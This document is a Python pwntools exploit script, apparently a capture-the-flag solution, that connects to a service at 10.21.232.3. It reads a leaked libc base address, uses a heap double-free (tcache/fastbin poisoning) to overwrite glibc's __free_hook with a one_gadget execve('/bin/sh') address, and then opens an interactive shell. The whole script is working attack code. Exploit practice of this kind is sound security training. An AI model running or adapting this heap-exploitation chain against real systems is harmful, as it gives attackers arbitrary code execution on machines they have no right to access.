#!/usr/bin/env python3

import struct, pwn

def discard(proc, user: int):
    proc.sendline(b"d\n" + str(user).encode())

def generate(proc, name: bytes):
    proc.sendline(b"g\n" + name)

pwn.context.terminal = ["tmux", "split-window", "-h"]

proc = pwn.remote('10.21.232.3', 20202)

# pwn.gdb.attach(proc, gdbscript='''
# b *gentok+55
# b *distok+117
# b *main+410
# set glibc 2.27
# ''', gdb_args=['-q', '-ex', 'init-pwndbg'])

"""
0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv
"""
ONE_GADGET = 0x4f302

# get the libc base
proc.recvuntil(b'Libc base: ')
libc_base = int(proc.recvuntil(b'\n').strip().decode(), 16)

# get offsets and calculate addresses
libc = pwn.ELF('./libc.so.6', checksec=False)
free_hook = libc_base + libc.sym["__free_hook"]
shell_gadget = libc_base + ONE_GADGET

pwn.log.info(f"Found {hex(shell_gadget)=} {hex(free_hook)=}")

for i in range(9):
    generate(proc, b"ABCD")

for i in range(7):
    discard(proc, i)

discard(proc, 7)
discard(proc, 8)
discard(proc, 7)

for i in range(7):
    generate(proc, b"ABCD")

generate(proc, struct.pack("<Q", free_hook))
generate(proc, b"ABCD")
generate(proc, b"ABCD")
generate(proc, struct.pack("<Q", shell_gadget))

discard(proc, 0)

proc.interactive()
